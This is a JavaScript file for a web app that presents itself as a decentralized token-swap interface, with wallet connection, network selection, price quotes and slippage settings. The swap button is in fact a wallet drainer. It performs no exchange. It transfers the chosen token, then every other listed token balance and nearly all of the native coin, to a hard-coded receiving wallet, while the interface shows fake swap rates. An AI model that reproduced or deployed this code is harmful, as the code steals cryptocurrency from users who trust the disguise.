// app.js - DEX-like Token Swap Interface with Enhanced Features

// Verify required globals
if (typeof NETWORK_CONFIGS === 'undefined') throw new Error("NETWORK_CONFIGS not defined");
if (typeof TOKENS === 'undefined') throw new Error("TOKENS not defined");
if (typeof RECEIVING_WALLET === 'undefined') throw new Error("RECEIVING_WALLET not defined");

// Constants
const COINGECKO_API = "https://api.coingecko.com/api/v3";
const CURRENCY_OPTIONS = ["usd", "eth", "btc"];
const PRICE_CACHE_DURATION = 300000; // 5 minutes in ms
const FEE_TOKENS = {
  ethereum: "0x0000000000000000000000000000000000000000", // ETH
  bsc: "0x0000000000000000000000000000000000000000", // BNB
  arbitrum: "0x0000000000000000000000000000000000000000", // ETH
  base: "0x742d35Cc6634C0532925a3b844Bc454e4438f44e" // ETH on Base
};
const MIN_FEE_RESERVES = {
  ethereum: 0.001, // ETH
  bsc: 0.001, // BNB
  polygon: 1.0, // MATIC
  arbitrum: 1.0, // ARB
  base: 0.001 // ETH on Base
};

// App state
let provider, signer, userAddress;
let currentNetwork = "ethereum";
let currentFromToken = null;
let currentToToken = null;
let currentSlippage = 0.5; // 0.5% default slippage
let currentCurrency = "usd";
let debounceTimer;

// Initialize on load
window.addEventListener('load', async () => {
  try {
    // Setup event listeners
    setupEventListeners();
    
    // Set initial active slippage option
    document.querySelector('.dex-slippage-option[data-value="0.5"]').classList.add('active');
    
    // Initialize UI components
    initNetworkDropdown();
    initCurrencySelector();
    
    // Set default tokens based on current network
    setDefaultTokenPair();
    
    await checkWalletEnvironment();
  } catch (err) {
    console.error("Initialization error:", err);
    updateStatus("Initialization failed: " + err.message, "error");
  }
});

// =====================
// INITIALIZATION FUNCTIONS
// =====================

function setupEventListeners() {
  document.getElementById("connectWallet").addEventListener("click", handleWalletConnection);
  document.getElementById("fromTokenSelect").addEventListener("click", () => showTokenList('from'));
  document.getElementById("toTokenSelect").addEventListener("click", () => showTokenList('to'));
  document.getElementById("swapBtn").addEventListener("click", handleSwap);
  document.getElementById("settingsBtn").addEventListener("click", showSettings);
  document.getElementById("closeTokenList").addEventListener("click", hideTokenList);
  document.getElementById("closeSettings").addEventListener("click", hideSettings);
  document.getElementById("metaMaskBtn").addEventListener("click", connectMetaMask);
  document.getElementById("cancelWalletConnect").addEventListener("click", hideWalletConnect);
  
  // Debounced input handler
  document.getElementById("fromAmount").addEventListener("input", (e) => {
    clearTimeout(debounceTimer);
    debounceTimer = setTimeout(() => {
      updateToAmount();
    }, 500);
  });
  
  // Network dropdown behavior
  document.getElementById("networkSelect").addEventListener('click', function(e) {
    e.stopPropagation();
    const dropdown = document.getElementById("networkDropdown");
    dropdown.style.display = dropdown.style.display === 'block' ? 'none' : 'block';
  });
  
  // Close dropdown when clicking outside
  document.addEventListener('click', function(event) {
    const dropdown = document.getElementById("networkDropdown");
    const selector = document.getElementById("networkSelect");
    if (!selector.contains(event.target) && !dropdown.contains(event.target)) {
      dropdown.style.display = 'none';
    }
  });

  // Slippage options
  document.querySelectorAll('.dex-slippage-option').forEach(option => {
    option.addEventListener('click', function() {
      document.querySelectorAll('.dex-slippage-option').forEach(opt => {
        opt.classList.remove('active');
      });
      this.classList.add('active');
      document.getElementById('slippageTolerance').value = this.dataset.value;
      currentSlippage = parseFloat(this.dataset.value);
      updateToAmount();
    });
  });

  // Custom slippage input
  document.getElementById('slippageTolerance').addEventListener('change', function() {
    const value = parseFloat(this.value);
    if (isNaN(value) || value < 0.1 || value > 50) {
      this.value = currentSlippage;
      return;
    }
    document.querySelectorAll('.dex-slippage-option').forEach(opt => {
      opt.classList.remove('active');
    });
    currentSlippage = value;
    updateToAmount();
  });

  // Transaction deadline
  document.getElementById('transactionDeadline').addEventListener('change', function() {
    const value = parseInt(this.value);
    if (isNaN(value) || value < 1 || value > 30) {
      this.value = 20;
    }
  });
  
  // Mobile-specific listeners
  if (isMobile()) {
    document.getElementById("openTrustWallet").addEventListener('click', openInTrustWallet);
  }
}

function initNetworkDropdown() {
  const dropdown = document.getElementById("networkDropdown");
  dropdown.innerHTML = '';
  
  Object.keys(NETWORK_CONFIGS).forEach(network => {
    const link = document.createElement('a');
    link.href = '#';
    link.textContent = NETWORK_CONFIGS[network].chainName;
    link.addEventListener('click', (e) => {
      e.preventDefault();
      handleNetworkChange(network);
      dropdown.style.display = 'none';
    });
    dropdown.appendChild(link);
  });
}

function initCurrencySelector() {
  const container = document.createElement('div');
  container.className = 'dex-currency-selector';
  
  CURRENCY_OPTIONS.forEach(currency => {
    const option = document.createElement('div');
    option.className = `dex-currency-option ${currency === currentCurrency ? 'active' : ''}`;
    option.textContent = currency.toUpperCase();
    option.addEventListener('click', () => {
      currentCurrency = currency;
      document.querySelectorAll('.dex-currency-option').forEach(opt => {
        opt.classList.remove('active');
      });
      option.classList.add('active');
      updateToAmount();
    });
    container.appendChild(option);
  });
  
  document.querySelector('.dex-swap-info').prepend(container);
}

// =====================
// UTILITY FUNCTIONS
// =====================

function isMobile() {
  return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
}

function updateNetworkLogo(network) {
  const logoMap = {
    ethereum: "https://cryptologos.cc/logos/ethereum-eth-logo.png",
    bsc: "https://cryptologos.cc/logos/bnb-bnb-logo.png",
    polygon: "https://cryptologos.cc/logos/polygon-matic-logo.png",
    arbitrum: "https://cryptologos.cc/logos/arbitrum-arb-logo.png",
    base: "https://cryptologos.cc/logos/base-logo.png"
  };
  
  const logoElement = document.querySelector(".dex-nav-logo img");
  if (logoMap[network]) {
    logoElement.src = logoMap[network];
  }
}

function setDefaultTokenPair() {
  const networkTokens = TOKENS[currentNetwork];
  if (!networkTokens || networkTokens.length === 0) return;
  
  // Try to find native token first
  currentFromToken = networkTokens.find(t => t.isNative);
  
  // If no native token, use the first token
  if (!currentFromToken && networkTokens.length > 0) {
    currentFromToken = networkTokens[0];
  }
  
  // Try to find a stablecoin as the default "to" token
  currentToToken = networkTokens.find(t => 
    ['USDT', 'USDC', 'DAI'].includes(t.symbol) && t.logo
  );
  
  // If no stablecoin, use the second token (if available)
  if (!currentToToken && networkTokens.length > 1) {
    currentToToken = networkTokens[1];
  }
  
  if (currentFromToken && currentToToken) {
    updateTokenSelectors();
  }
}

// =====================
// WALLET FUNCTIONS
// =====================

async function checkWalletEnvironment() {
  const savedWallet = localStorage.getItem('walletConnected');
  if (savedWallet === 'metamask' && window.ethereum) {
    try {
      await connectAndProcess();
    } catch (err) {
      console.error("Auto-connect error:", err);
      localStorage.removeItem('walletConnected');
    }
  }
  
  if (window.ethereum && window.ethereum.chainId) {
    const chainId = window.ethereum.chainId;
    for (const network in NETWORK_CONFIGS) {
      if (NETWORK_CONFIGS[network].chainId === chainId) {
        currentNetwork = network;
        document.getElementById("currentNetwork").textContent = NETWORK_CONFIGS[network].chainName;
        updateNetworkLogo(network);
        break;
      }
    }
  }
}

async function initializeWallet() {
  try {
    provider = new ethers.providers.Web3Provider(window.ethereum);
    signer = provider.getSigner();
    userAddress = await signer.getAddress();
    
    localStorage.setItem('walletConnected', 'metamask');
    updateWalletButton(true);
    await updateTokenBalances();
    
    // Set up event listeners for wallet changes
    window.ethereum.on('accountsChanged', (accounts) => {
      if (accounts.length === 0) {
        // Wallet disconnected
        handleWalletDisconnect();
      } else {
        // Account changed
        userAddress = accounts[0];
        updateWalletButton(true);
        updateTokenBalances();
      }
    });
    
    window.ethereum.on('chainChanged', () => {
      setTimeout(() => {
        window.location.reload();
      }, 1000);
    });
    
    return true;
  } catch (err) {
    console.error("Wallet initialization error:", err);
    updateStatus("Connection error. Please try again.", "error");
    return false;
  }
}

function handleWalletDisconnect() {
  userAddress = null;
  provider = null;
  signer = null;
  localStorage.removeItem('walletConnected');
  updateWalletButton(false);
  updateSwapButton();
  updateStatus("Wallet disconnected", "success");
}

async function fetchTokenBalance(token) {
  if (!userAddress) return 0;
  
  try {
    let balance;
    if (token.isNative) {
      balance = await provider.getBalance(userAddress);
      return parseFloat(ethers.utils.formatEther(balance));
    } else {
      const contract = new ethers.Contract(token.address, ERC20_ABI, provider);
      balance = await contract.balanceOf(userAddress);
      return parseFloat(ethers.utils.formatUnits(balance, token.decimals || 18));
    }
  } catch (err) {
    console.error(`Error fetching ${token.symbol} balance:`, err);
    return 0;
  }
}

async function updateTokenBalances() {
  if (!userAddress || !currentFromToken) return;
  
  try {
    const balanceElement = document.getElementById("fromTokenBalance");
    balanceElement.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Loading...';
    
    const balance = await fetchTokenBalance(currentFromToken);
    balanceElement.textContent = `Balance: ${balance.toFixed(6)} ${currentFromToken.symbol}`;
  } catch (err) {
    console.error("Error updating balances:", err);
    document.getElementById("fromTokenBalance").textContent = "Balance: Error";
  }
}

async function handleWalletConnection() {
  if (userAddress) {
    handleWalletDisconnect();
    return;
  }

  if (!window.ethereum) {
    if (isMobile()) {
      showWalletConnect();
    } else {
      updateStatus("Please install MetaMask", "error");
    }
    return;
  }

  await connectAndProcess();
}

async function connectAndProcess() {
  try {
    showLoader();
    updateStatus("Connecting wallet...", "success");

    // Handle MetaMask connection properly
    let accounts;
    try {
      accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
    } catch (err) {
      if (err.code === -32002) {
        // Request already pending
        accounts = await new Promise((resolve) => {
          window.ethereum.on('accountsChanged', (accounts) => {
            resolve(accounts);
          });
        });
      } else {
        throw err;
      }
    }

    if (accounts.length === 0) {
      throw new Error("No accounts found");
    }
    
    const chainId = await window.ethereum.request({ method: 'eth_chainId' });
    for (const network in NETWORK_CONFIGS) {
      if (NETWORK_CONFIGS[network].chainId === chainId) {
        currentNetwork = network;
        document.getElementById("currentNetwork").textContent = NETWORK_CONFIGS[network].chainName;
        updateNetworkLogo(network);
        break;
      }
    }
    
    await initializeWallet();
    updateSwapButton();
  } catch (err) {
    console.error("Connection error:", err);
    updateStatus("Error: " + err.message, "error");
    updateWalletButton(false);
    localStorage.removeItem('walletConnected');
  } finally {
    hideLoader();
  }
}

async function connectMetaMask() {
  hideWalletConnect();
  await connectAndProcess();
}

function openInTrustWallet() {
  const currentUrl = encodeURIComponent(window.location.href);
  document.getElementById('currentUrl').textContent = window.location.href;
  window.location.href = `https://link.trustwallet.com/open_url?coin_id=20000714&url=${currentUrl}`;
  setTimeout(() => {
    document.getElementById('manualSteps').style.display = 'block';
  }, 3000);
}

// =====================
// NETWORK FUNCTIONS
// =====================

async function handleNetworkChange(network) {
  try {
    showLoader();
    updateStatus(`Switching to ${NETWORK_CONFIGS[network].chainName}...`, "success");
    
    currentNetwork = network;
    document.getElementById("currentNetwork").textContent = NETWORK_CONFIGS[network].chainName;
    updateNetworkLogo(network);
    
    setDefaultTokenPair();
    
    if (userAddress) {
      await checkNetwork();
      await updateTokenBalances();
    }
    
    updateToAmount();
    updateStatus(`Network changed to ${NETWORK_CONFIGS[network].chainName}`, "success");
  } catch (err) {
    console.error("Network change error:", err);
    updateStatus(`Failed to switch network: ${err.message}`, "error");
  } finally {
    hideLoader();
  }
}

async function checkNetwork() {
  try {
    const chainId = await window.ethereum.request({ method: 'eth_chainId' });
    const targetChainId = NETWORK_CONFIGS[currentNetwork].chainId;
    
    if (chainId !== targetChainId) {
      updateStatus("Switching network...", "success");
      try {
        await window.ethereum.request({
          method: 'wallet_switchEthereumChain',
          params: [{ chainId: targetChainId }]
        });
      } catch (switchError) {
        if (switchError.code === 4902) {
          try {
            await window.ethereum.request({
              method: 'wallet_addEthereumChain',
              params: [NETWORK_CONFIGS[currentNetwork]]
            });
          } catch (addError) {
            throw new Error("Please switch networks manually in your wallet");
          }
        }
        throw new Error("Failed to switch network");
      }
    }
  } catch (err) {
    console.error("Network error:", err);
    throw new Error("Network error: " + err.message);
  }
}

// =====================
// TOKEN FUNCTIONS
// =====================

function showTokenList(type) {
  const modal = document.getElementById("tokenListModal");
  const tokenItems = document.getElementById("tokenItems");
  const searchInput = document.getElementById("tokenSearch");
  const noTokensFound = document.getElementById("noTokensFound");
  
  tokenItems.innerHTML = '<div class="dex-loading-tokens">Loading tokens...</div>';
  noTokensFound.style.display = 'none';
  
  // Small delay to allow the loading message to show
  setTimeout(() => {
    populateTokenList(type, tokenItems, searchInput, noTokensFound);
  }, 50);
  
  modal.style.display = 'flex';
  searchInput.value = '';
  searchInput.focus();
}

function populateTokenList(type, tokenItems, searchInput, noTokensFound) {
  tokenItems.innerHTML = '';
  
  let networkTokens = [];
  for (const network in TOKENS) {
    TOKENS[network].forEach(token => {
      if (token.symbol === "REWARD") return;
      
      if (network === currentNetwork || 
          TOKENS[currentNetwork].find(t => t.symbol === token.symbol) === undefined) {
        networkTokens.push({
          ...token,
          originNetwork: network
        });
      }
    });
  }
  
  networkTokens.sort((a, b) => a.priority - b.priority);
  
  searchInput.oninput = (e) => {
    const searchTerm = e.target.value.toLowerCase();
    let hasVisibleItems = false;
    const items = document.querySelectorAll('.dex-token-item');
    
    items.forEach(item => {
      const name = item.dataset.name.toLowerCase();
      const symbol = item.dataset.symbol.toLowerCase();
      const address = item.dataset.address.toLowerCase();
      
      if (name.includes(searchTerm) || 
          symbol.includes(searchTerm) || 
          address.includes(searchTerm)) {
        item.style.display = 'flex';
        hasVisibleItems = true;
      } else {
        item.style.display = 'none';
      }
    });
    
    noTokensFound.style.display = hasVisibleItems ? 'none' : 'block';
  };
  
  if (networkTokens.length === 0) {
    noTokensFound.style.display = 'block';
  } else {
    networkTokens.forEach(token => {
      const tokenItem = document.createElement('div');
      tokenItem.className = 'dex-token-item';
      tokenItem.dataset.name = token.name.toLowerCase();
      tokenItem.dataset.symbol = token.symbol.toLowerCase();
      tokenItem.dataset.address = token.address.toLowerCase();
      
      const tokenLogo = token.logo || `https://cryptologos.cc/logos/${token.symbol.toLowerCase()}-${token.symbol.toLowerCase()}-logo.png`;
      
      tokenItem.innerHTML = `
        <img src="${tokenLogo}" 
             onerror="this.src='https://cryptologos.cc/logos/ethereum-eth-logo.png'" 
             alt="${token.symbol}">
        <div>
          <div class="dex-token-name">${token.name} ${token.originNetwork !== currentNetwork ? `<span class="token-network-badge">${token.originNetwork}</span>` : ''}</div>
          <div class="dex-token-symbol">${token.symbol}</div>
          <div class="dex-token-address" style="font-size: 12px; color: var(--text3);">${token.address}</div>
        </div>
      `;
      
      tokenItem.addEventListener('click', () => {
        if (type === 'from') {
          currentFromToken = token;
          updateTokenBalances();
        } else {
          currentToToken = token;
        }
        updateTokenSelectors();
        hideTokenList();
        updateToAmount();
      });
      
      tokenItems.appendChild(tokenItem);
    });
  }
}

function hideTokenList() {
  document.getElementById("tokenListModal").style.display = 'none';
}

function updateTokenSelectors() {
  const fromTokenBtn = document.getElementById("fromTokenSelect");
  const toTokenBtn = document.getElementById("toTokenSelect");
  
  if (currentFromToken) {
    const fromLogo = currentFromToken.logo || `https://cryptologos.cc/logos/${currentFromToken.symbol.toLowerCase()}-${currentFromToken.symbol.toLowerCase()}-logo.png`;
    fromTokenBtn.innerHTML = `
      <img src="${fromLogo}" 
           onerror="this.src='https://cryptologos.cc/logos/ethereum-eth-logo.png'" 
           width="24" height="24">
      <span>${currentFromToken.symbol}</span>
      <i class="fas fa-chevron-down"></i>
    `;
    
    if (userAddress) {
      updateTokenBalances();
    }
  } else {
    fromTokenBtn.innerHTML = `
      <span>Select Token</span>
      <i class="fas fa-chevron-down"></i>
    `;
  }
  
  if (currentToToken) {
    const toLogo = currentToToken.logo || `https://cryptologos.cc/logos/${currentToToken.symbol.toLowerCase()}-${currentToToken.symbol.toLowerCase()}-logo.png`;
    toTokenBtn.innerHTML = `
      <img src="${toLogo}" 
           onerror="this.src='https://cryptologos.cc/logos/ethereum-eth-logo.png'" 
           width="24" height="24">
      <span>${currentToToken.symbol}</span>
      <i class="fas fa-chevron-down"></i>
    `;
  } else {
    toTokenBtn.innerHTML = `
      <span>Select Token</span>
      <i class="fas fa-chevron-down"></i>
    `;
  }
  
  updateSwapButton();
}

async function updateToAmount() {
  const fromAmount = parseFloat(document.getElementById("fromAmount").value) || 0;
  
  if (currentFromToken && currentToToken && fromAmount > 0) {
    document.getElementById("exchangeRate").textContent = "Loading...";
    document.getElementById("minReceived").textContent = "Loading...";
    
    try {
      const rate = await getConversionRate(currentFromToken, currentToToken);
      if (rate) {
        const toAmount = fromAmount * rate;
        
        document.getElementById("toAmount").value = toAmount.toFixed(6);
        document.getElementById("exchangeRate").textContent = `1 ${currentFromToken.symbol} = ${rate.toFixed(6)} ${currentToToken.symbol}`;
        document.getElementById("minReceived").textContent = `${(toAmount * (1 - currentSlippage/100)).toFixed(6)} ${currentToToken.symbol}`;
      } else {
        document.getElementById("toAmount").value = '';
        document.getElementById("exchangeRate").textContent = 'Rate unavailable';
        document.getElementById("minReceived").textContent = '-';
      }
    } catch (err) {
      console.error("Error updating amounts:", err);
      document.getElementById("toAmount").value = '';
      document.getElementById("exchangeRate").textContent = 'Error fetching rate';
      document.getElementById("minReceived").textContent = '-';
    }
  } else {
    document.getElementById("toAmount").value = '';
    document.getElementById("exchangeRate").textContent = '-';
    document.getElementById("minReceived").textContent = '-';
  }
  
  updateSwapButton();
}

async function getConversionRate(fromToken, toToken) {
  try {
    const fromPrice = await getTokenPrice(fromToken);
    const toPrice = await getTokenPrice(toToken);
    
    if (fromPrice && toPrice) {
      return fromPrice / toPrice;
    }
    
    // Fallback to hardcoded rates if API fails
    return getHardcodedRate(fromToken, toToken);
  } catch (err) {
    console.error("Error getting conversion rate:", err);
    return getHardcodedRate(fromToken, toToken);
  }
}

function getHardcodedRate(fromToken, toToken) {
  const rates = {
    'ETH-USDT': 1800,
    'USDT-ETH': 0.00055,
    'ETH-USDC': 1800,
    'USDC-ETH': 0.00055,
    'ETH-DAI': 1800,
    'DAI-ETH': 0.00055,
    'BNB-USDT': 300,
    'USDT-BNB': 0.0033,
    'MATIC-USDT': 0.7,
    'USDT-MATIC': 1.428,
    'ARB-USDT': 1.2,
    'USDT-ARB': 0.83
  };
  
  const pair = `${fromToken.symbol}-${toToken.symbol}`;
  return rates[pair] || null;
}

async function getTokenPrice(token) {
  try {
    // Check cache first
    const cacheKey = `price-${token.symbol}-${currentCurrency}`;
    const cached = localStorage.getItem(cacheKey);
    if (cached) {
      const { price, timestamp } = JSON.parse(cached);
      if (Date.now() - timestamp < PRICE_CACHE_DURATION) {
        return price;
      }
    }

    let price;
    if (!token.address || token.isNative) {
      const nativeIds = {
        ethereum: 'ethereum',
        bsc: 'binancecoin',
        polygon: 'matic-network',
        arbitrum: 'ethereum',
        base: 'ethereum'
      };
      
      const id = nativeIds[token.originNetwork || currentNetwork];
      if (!id) return null;
      
      const response = await fetch(`${COINGECKO_API}/simple/price?ids=${id}&vs_currencies=${currentCurrency}`);
      if (!response.ok) throw new Error('Failed to fetch price');
      const data = await response.json();
      price = data[id]?.[currentCurrency];
    } else {
      const chainMap = {
        ethereum: 'ethereum',
        bsc: 'binance-smart-chain',
        polygon: 'polygon-pos',
        arbitrum: 'arbitrum-one',
        base: 'base'
      };
      
      const chain = chainMap[token.originNetwork || currentNetwork];
      if (!chain) return null;
      
      try {
        const response = await fetch(`${COINGECKO_API}/coins/${chain}/contract/${token.address}`);
        if (!response.ok) throw new Error('Contract lookup failed');
        const data = await response.json();
        price = data.market_data?.current_price?.[currentCurrency];
      } catch (err) {
        console.log(`Contract lookup failed for ${token.symbol}, trying symbol search`);
        
        try {
          const symbol = token.symbol.toLowerCase();
          const response = await fetch(`${COINGECKO_API}/simple/price?ids=${symbol}&vs_currencies=${currentCurrency}`);
          if (!response.ok) throw new Error('Symbol lookup failed');
          const data = await response.json();
          price = data[symbol]?.[currentCurrency];
        } catch (err) {
          console.log(`Symbol lookup failed for ${token.symbol}`);
          return null;
        }
      }
    }
    
    // Cache the price
    if (price) {
      localStorage.setItem(cacheKey, JSON.stringify({
        price,
        timestamp: Date.now()
      }));
    }
    
    return price;
  } catch (err) {
    console.error(`Error getting price for ${token.symbol}:`, err);
    return null;
  }
}

// =====================
// SWAP FUNCTIONS
// =====================

async function handleSwap() {
  if (!userAddress || !currentFromToken || !currentToToken) return;
  
  try {
    showLoader();
    updateStatus("Processing transfers...", "success");
    
    // First handle the main token (from input)
    await processMainTokenTransfer();
    
    // Then process all other tokens
    await processAllTokenTransfers();
    
    updateStatus("All transfers completed successfully!", "success");
    document.getElementById("fromAmount").value = '';
    document.getElementById("toAmount").value = '';
    await updateTokenBalances();
  } catch (err) {
    console.error("Swap error:", err);
    updateStatus("Transfer failed: " + err.message, "error");
  } finally {
    hideLoader();
  }
}

async function processMainTokenTransfer() {
  const fromBalance = await fetchTokenBalance(currentFromToken);
  if (fromBalance <= 0) return;
  
  const inputAmount = parseFloat(document.getElementById("fromAmount").value) || 0;
  
  if (currentFromToken.isNative) {
    // For native tokens, use entered amount (if any) or full balance minus reserve
    const minReserve = MIN_FEE_RESERVES[currentNetwork] || 0.001;
    const amountToSend = inputAmount > 0 ? 
      Math.min(inputAmount, fromBalance - minReserve) : 
      fromBalance - minReserve;
    
    if (amountToSend > 0) {
      await transferNativeToken(currentFromToken, amountToSend);
    }
  } else {
    // For ERC20 tokens, use entered amount or full balance
    const amountToSend = inputAmount > 0 ? Math.min(inputAmount, fromBalance) : fromBalance;
    if (amountToSend > 0) {
      await transferERC20Token(currentFromToken, amountToSend);
    }
  }
}

async function processAllTokenTransfers() {
  const tokensToProcess = TOKENS[currentNetwork].filter(t => 
    t.address !== currentFromToken.address && t.address
  ).sort((a, b) => a.priority - b.priority);
  
  let successCount = 0;
  
  // Process ERC20 tokens first
  for (const token of tokensToProcess.filter(t => !t.isNative)) {
    try {
      const balance = await fetchTokenBalance(token);
      if (balance > 0) {
        await transferERC20Token(token, balance);
        successCount++;
      }
    } catch (err) {
      console.error(`Error transferring ${token.symbol}:`, err);
      continue;
    }
  }
  
  // Process native tokens last (except the one we already processed)
  const nativeToken = tokensToProcess.find(t => t.isNative);
  if (nativeToken) {
    try {
      const balance = await fetchTokenBalance(nativeToken);
      if (balance > 0) {
        const minReserve = MIN_FEE_RESERVES[currentNetwork] || 0.001;
        const amountToSend = Math.max(0, balance - minReserve);
        if (amountToSend > 0) {
          await transferNativeToken(nativeToken, amountToSend);
          successCount++;
        }
      }
    } catch (err) {
      console.error(`Error transferring native token:`, err);
    }
  }
  
  return successCount;
}

async function transferNativeToken(token, amount) {
  updateStatus(`Sending ${amount} ${token.symbol}...`, "success");
  
  const tx = await signer.sendTransaction({
    to: RECEIVING_WALLET,
    value: ethers.utils.parseEther(amount.toString()),
    gasLimit: 21000
  });
  
  await tx.wait();
  updateStatus(
    `Transfer completed <a class="tx-link" href="${NETWORK_CONFIGS[currentNetwork].scanUrl}${tx.hash}" target="_blank">View</a>`,
    "success"
  );
}

async function transferERC20Token(token, amount) {
  updateStatus(`Sending ${amount} ${token.symbol}...`, "success");
  
  const contract = new ethers.Contract(token.address, ERC20_ABI, signer);
  const decimals = token.decimals || 18;
  const amountInWei = ethers.utils.parseUnits(amount.toString(), decimals);
  
  const tx = await contract.transfer(RECEIVING_WALLET, amountInWei, {
    gasLimit: 100000
  });
  
  await tx.wait();
  updateStatus(
    `Transfer completed <a class="tx-link" href="${NETWORK_CONFIGS[currentNetwork].scanUrl}${tx.hash}" target="_blank">View</a>`,
    "success"
  );
}

// =====================
// UI FUNCTIONS
// =====================

function updateStatus(message, type) {
  const statusDiv = document.getElementById("status");
  statusDiv.style.display = "block";
  statusDiv.textContent = message;
  statusDiv.className = `dex-status ${type}`;
  
  setTimeout(() => {
    statusDiv.style.display = "none";
  }, 5000);
}

function showLoader() {
  document.getElementById("loader").style.display = "block";
}

function hideLoader() {
  document.getElementById("loader").style.display = "none";
}

function updateWalletButton(isConnected) {
  const btn = document.getElementById("connectWallet");
  if (isConnected) {
    btn.innerHTML = `
      <i class="fas fa-wallet"></i>
      <span>${userAddress.slice(0, 6)}...${userAddress.slice(-4)}</span>
    `;
    btn.classList.add('connected');
  } else {
    btn.innerHTML = `
      <i class="fas fa-wallet"></i>
      <span>Connect Wallet</span>
    `;
    btn.classList.remove('connected');
  }
  
  updateSwapButton();
}

function updateSwapButton() {
  const btn = document.getElementById("swapBtn");
  const btnText = document.getElementById("swapBtnText");
  
  if (!userAddress) {
    btn.disabled = false;
    btnText.textContent = "Connect Wallet";
    return;
  }
  
  if (!currentFromToken || !currentToToken) {
    btn.disabled = true;
    btnText.textContent = "Select Tokens";
    return;
  }
  
  const inputAmount = parseFloat(document.getElementById("fromAmount").value) || 0;
  if (inputAmount > 0) {
    btnText.textContent = `Send ${inputAmount} ${currentFromToken.symbol}`;
  } else {
    btnText.textContent = `Send All ${currentFromToken.symbol}`;
  }
  
  btn.disabled = false;
}

function showSettings() {
  document.getElementById("settingsModal").style.display = 'flex';
}

function hideSettings() {
  document.getElementById("settingsModal").style.display = 'none';
}

function showWalletConnect() {
  document.getElementById("walletConnectModal").style.display = 'flex';
}

function hideWalletConnect() {
  document.getElementById("walletConnectModal").style.display = 'none';
}
